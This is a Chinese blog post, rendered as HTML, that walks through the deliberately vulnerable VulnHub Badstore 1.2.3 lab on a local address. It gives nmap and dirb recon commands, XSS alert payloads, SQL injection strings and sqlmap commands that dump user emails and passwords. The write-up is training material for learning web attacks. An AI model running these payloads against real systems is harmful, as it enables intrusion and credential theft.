@@ -1,0 +1,672 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    VulnHub Badstore：1.2.3 | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="Badstore 1.2.3项目地址 1docker pull suc2es2&#x2F;badstore  使用 Nmap 扫描出开放服务及操作系统版本 1nmap -sS -sV -O -p- 192.168.41.129       打开访问网站  使用 dirb 扫描后台 1dirb http:&#x2F;&#x2F;192.168.41.129:8080&#x2F;   敏感信息泄露&#x2F;supplier&#x2F;ac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub Badstore：1.2.3">
+<meta property="og:url" content="http://example.com/2026/04/01/Badstore%201.2.3/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="Badstore 1.2.3项目地址 1docker pull suc2es2&#x2F;badstore  使用 Nmap 扫描出开放服务及操作系统版本 1nmap -sS -sV -O -p- 192.168.41.129       打开访问网站  使用 dirb 扫描后台 1dirb http:&#x2F;&#x2F;192.168.41.129:8080&#x2F;   敏感信息泄露&#x2F;supplier&#x2F;ac">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69156f743203f7be00fd6d69.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69157e573203f7be00fe2c23.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69157edd3203f7be00fe33a7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69157f133203f7be00fe36ff.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69157f853203f7be00fe3d6c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69157fe63203f7be00fe4304.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/691580193203f7be00fe45dd.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/695e1ae9ee664bba8768028f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/695e1b1fee664bba8768029d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/695e1b4aee664bba8768029f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/695e1b33ee664bba8768029e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6967233f99f37a647f572102.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6967235899f37a647f572119.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6967238f99f37a647f572146.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6967501699f37a647f5807b6.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6967504d99f37a647f5807ff.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6967507199f37a647f580829.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6967242099f37a647f5721e7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/696723e899f37a647f5721a9.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6967255d99f37a647f5722f6.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/696725a299f37a647f572344.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69672d1699f37a647f572b2a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69672ccb99f37a647f572a9b.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/691580a93203f7be00fe4d90.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/691581c23203f7be00fe6524.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/691582de3203f7be00fe6bf0.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/691584583203f7be00fe6e51.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/691584e23203f7be00fe6f48.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/691585743203f7be00fe707c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/691585b13203f7be00fe720d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6985ad44f8ef6591278d4a68.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6985ae66f8ef6591278d4b1e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/691588643203f7be00fe86d9.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/696722db99f37a647f57209e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/695f188a91a79def7e4d8ebc.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/696728dc99f37a647f5726a3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/696728cc99f37a647f572691.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69672d1699f37a647f572b2a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69672d6399f37a647f572b7e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69672dd699f37a647f572c0d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/691588043203f7be00fe8637.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/691587cb3203f7be00fe84bd.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/696729e199f37a647f5727aa.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69672a6299f37a647f57283e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69672a5799f37a647f572830.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69672ae399f37a647f5728c0.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69672b4899f37a647f57291f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69672c0999f37a647f5729cb.png">
+<meta property="article:published_time" content="2026-04-01T08:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-01T09:07:22.735Z">
+<meta property="article:author" content="ALL">
+<meta property="article:tag" content="SQL 注入">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="任意密码重置">
+<meta property="article:tag" content="支付漏洞">
+<meta property="article:tag" content="敏感信息泄露">
+<meta property="article:tag" content="越权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/69156f743203f7be00fd6d69.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub Badstore：1.2.3">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">VulnHub Badstore：1.2.3</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Badstore-1-2-3"><span class="toc-number">1.</span> <span class="toc-text">Badstore 1.2.3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text">敏感信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#supplier-accounts"><span class="toc-number">1.1.1.</span> <span class="toc-text">&#x2F;supplier&#x2F;accounts</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.2.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Search-%E6%90%9C%E7%B4%A2%E6%A1%86%EF%BC%88%E5%8F%8D%E5%B0%84%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">Search 搜索框（反射）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign-Our-Guestbook%EF%BC%88%E4%B8%89%E4%B8%AA%E5%AD%98%E5%82%A8%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">Sign Our Guestbook（三个存储）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-Account%EF%BC%88%E6%9C%AA%E7%99%BB%E5%BD%95%EF%BC%8C%E5%8F%8D%E5%B0%84%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">My Account（未登录，反射）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-Account%EF%BC%88%E5%B7%B2%E7%99%BB%E5%BD%95%EF%BC%8C%E4%B8%A4%E4%B8%AA%E5%AD%98%E5%82%A8%EF%BC%89"><span class="toc-number">1.2.4.</span> <span class="toc-text">My Account（已登录，两个存储）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-Register%EF%BC%88%E4%B8%A4%E4%B8%AA%E5%AD%98%E5%82%A8%EF%BC%89"><span class="toc-number">1.2.5.</span> <span class="toc-text">Login&#x2F;Register（两个存储）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminpotal-Add-User%EF%BC%88%E5%AD%98%E5%82%A8%EF%BC%89"><span class="toc-number">1.2.6.</span> <span class="toc-text">Adminpotal Add User（存储）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Search-%E6%90%9C%E7%B4%A2%E6%A1%86"><span class="toc-number">1.3.1.</span> <span class="toc-text">Search 搜索框</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What%E2%80%99s-New-Add-ltems-to-Cart"><span class="toc-number">1.3.2.</span> <span class="toc-text">What’s New Add ltems to Cart</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Supplier-Login"><span class="toc-number">1.3.3.</span> <span class="toc-text">Supplier Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-Register"><span class="toc-number">1.3.4.</span> <span class="toc-text">Login&#x2F;Register</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminpotal-Add-User"><span class="toc-number">1.3.5.</span> <span class="toc-text">Adminpotal Add User</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminpotal-Delete-User"><span class="toc-number">1.3.6.</span> <span class="toc-text">Adminpotal Delete User</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">1.4.</span> <span class="toc-text">任意密码重置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reset-User-Password"><span class="toc-number">1.4.1.</span> <span class="toc-text">Reset User Password</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">支付漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#View-Cart"><span class="toc-number">1.5.1.</span> <span class="toc-text">View Cart</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">越权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-Register-1"><span class="toc-number">1.6.1.</span> <span class="toc-text">Login&#x2F;Register</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">39</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-Badstore 1.2.3" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-01T08:00:00.000Z" itemprop="datePublished">2026-04-01</time>
+    <time style="display: none;" id="post-update-time">2026-04-01</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="Badstore-1-2-3"><a href="#Badstore-1-2-3" class="headerlink" title="Badstore 1.2.3"></a>Badstore 1.2.3</h1><p>项目地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull suc2es2/badstore</span><br></pre></td></tr></table></figure>
+
+<p>使用 Nmap 扫描出开放服务及操作系统版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -O -p- 192.168.41.129    </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69156f743203f7be00fd6d69.png"></p>
+<p>打开访问网站</p>
+<p><img src="https://pic1.imgdb.cn/item/69157e573203f7be00fe2c23.png"></p>
+<p>使用 dirb 扫描后台</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.41.129:8080/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69157edd3203f7be00fe33a7.png"></p>
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="supplier-accounts"><a href="#supplier-accounts" class="headerlink" title="&#x2F;supplier&#x2F;accounts"></a>&#x2F;supplier&#x2F;accounts</h3><p><strong>路径 <code>/supplier/accounts</code> 泄露了类型 <code>etc/passwd</code> 的敏感信息</strong></p>
+<p><img src="https://pic1.imgdb.cn/item/69157f133203f7be00fe36ff.png"></p>
+<p>Base64 解码出来</p>
+<p><img src="https://pic1.imgdb.cn/item/69157f853203f7be00fe3d6c.png"></p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="Search-搜索框（反射）"><a href="#Search-搜索框（反射）" class="headerlink" title="Search 搜索框（反射）"></a>Search 搜索框（反射）</h3><p>对搜索框输入测试发现 SQL 报错语句</p>
+<p><img src="https://pic1.imgdb.cn/item/69157fe63203f7be00fe4304.png"></p>
+<p><strong>应该将 <code>1</code> 回显到了网页上所以测试反射 XSS 漏洞发现也存在</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/691580193203f7be00fe45dd.png"></p>
+<h3 id="Sign-Our-Guestbook（三个存储）"><a href="#Sign-Our-Guestbook（三个存储）" class="headerlink" title="Sign Our Guestbook（三个存储）"></a>Sign Our Guestbook（三个存储）</h3><p>Sign Our Guestbook 中存在<strong>三个存储 XSS 漏洞</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/695e1ae9ee664bba8768028f.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/695e1b1fee664bba8768029d.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/695e1b4aee664bba8768029f.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/695e1b33ee664bba8768029e.png"></p>
+<h3 id="My-Account（未登录，反射）"><a href="#My-Account（未登录，反射）" class="headerlink" title="My Account（未登录，反射）"></a>My Account（未登录，反射）</h3><p>在邮件地址这里</p>
+<p><img src="https://pic1.imgdb.cn/item/6967233f99f37a647f572102.png"></p>
+<p>直接回显到了网页上，<strong>反射型 XSS</strong></p>
+<p><img src="https://pic1.imgdb.cn/item/6967235899f37a647f572119.png"></p>
+<p>同样存在 XSS 漏洞</p>
+<p><img src="https://pic1.imgdb.cn/item/6967238f99f37a647f572146.png"></p>
+<h3 id="My-Account（已登录，两个存储）"><a href="#My-Account（已登录，两个存储）" class="headerlink" title="My Account（已登录，两个存储）"></a>My Account（已登录，两个存储）</h3><p>构造 XSS Payload</p>
+<p><img src="https://pic1.imgdb.cn/item/6967501699f37a647f5807b6.png"></p>
+<p>第一个弹窗了</p>
+<p><img src="https://pic1.imgdb.cn/item/6967504d99f37a647f5807ff.png"></p>
+<p>第二个也是</p>
+<p><img src="https://pic1.imgdb.cn/item/6967507199f37a647f580829.png"></p>
+<h3 id="Login-Register（两个存储）"><a href="#Login-Register（两个存储）" class="headerlink" title="Login&#x2F;Register（两个存储）"></a>Login&#x2F;Register（两个存储）</h3><p>在注册的 <code>Full Name</code> 中存在<strong>存储型 XSS 漏洞</strong></p>
+<p><img src="https://pic1.imgdb.cn/item/6967242099f37a647f5721e7.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/696723e899f37a647f5721a9.png"></p>
+<p>同时 <code>Email Address</code> 也存在 <strong>存储型 XSS</strong></p>
+<p><img src="https://pic1.imgdb.cn/item/6967255d99f37a647f5722f6.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/696725a299f37a647f572344.png"></p>
+<h3 id="Adminpotal-Add-User（存储）"><a href="#Adminpotal-Add-User（存储）" class="headerlink" title="Adminpotal Add User（存储）"></a>Adminpotal Add User（存储）</h3><p>拿到管理员权限后在用户添加处存在<strong>存储型 XSS</strong> 漏洞</p>
+<p><img src="https://pic1.imgdb.cn/item/69672d1699f37a647f572b2a.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/69672ccb99f37a647f572a9b.png"></p>
+<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><h3 id="Search-搜索框"><a href="#Search-搜索框" class="headerlink" title="Search 搜索框"></a>Search 搜索框</h3><p><strong>注入万能语句回显正常</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/691580a93203f7be00fe4d90.png"></p>
+<p>推测没有做任何过滤，直接上 SQLMap 爆库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.41.129:8080/cgi-bin/badstore.cgi&quot;</span> --data=<span class="string">&quot;searchquery=1&amp;action=search&quot;</span> --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/691581c23203f7be00fe6524.png"></p>
+<p>爆表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.41.129:8080/cgi-bin/badstore.cgi&quot;</span> --data=<span class="string">&quot;searchquery=1&amp;action=search&quot;</span> -D badstoredb --tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/691582de3203f7be00fe6bf0.png"></p>
+<p>直接爆用户表字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.41.129:8080/cgi-bin/badstore.cgi&quot; --data=&quot;searchquery=1&amp;action=search&quot; -D badstoredb -T userdb --columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/691584583203f7be00fe6e51.png"></p>
+<p>随便就是 dump 出数据发现 admin</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.41.129:8080/cgi-bin/badstore.cgi&quot;</span> --data=<span class="string">&quot;searchquery=1&amp;action=search&quot;</span> -D badstoredb -T userdb -C email --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/691584e23203f7be00fe6f48.png"></p>
+<p>再 dump 出密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.41.129:8080/cgi-bin/badstore.cgi&quot;</span> --data=<span class="string">&quot;searchquery=1&amp;action=search&quot;</span> -D badstoredb -T userdb -C passwd --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/691585743203f7be00fe707c.png"></p>
+<p>撞库出密码</p>
+<p><img src="https://pic1.imgdb.cn/item/691585b13203f7be00fe720d.png"></p>
+<p>结果登不进去</p>
+<h3 id="What’s-New-Add-ltems-to-Cart"><a href="#What’s-New-Add-ltems-to-Cart" class="headerlink" title="What’s New Add ltems to Cart"></a>What’s New Add ltems to Cart</h3><p>添加商品也存在 SQL 注入，加单引号报错</p>
+<p><img src="https://pic1.imgdb.cn/item/6985ad44f8ef6591278d4a68.png"></p>
+<p>成功爆破出数据库名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)-- -</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/6985ae66f8ef6591278d4b1e.png"></p>
+<h3 id="Supplier-Login"><a href="#Supplier-Login" class="headerlink" title="Supplier Login"></a>Supplier Login</h3><p>在这个登录处同样存在 SQL 注入漏洞，参数是 <code>email</code></p>
+<p><img src="https://pic1.imgdb.cn/item/691588643203f7be00fe86d9.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/696722db99f37a647f57209e.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/695f188a91a79def7e4d8ebc.png"></p>
+<h3 id="Login-Register"><a href="#Login-Register" class="headerlink" title="Login&#x2F;Register"></a>Login&#x2F;Register</h3><p>在登录处也是 <code>email</code> 参数存在 SQL 注入</p>
+<p><img src="https://pic1.imgdb.cn/item/696728dc99f37a647f5726a3.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/696728cc99f37a647f572691.png"></p>
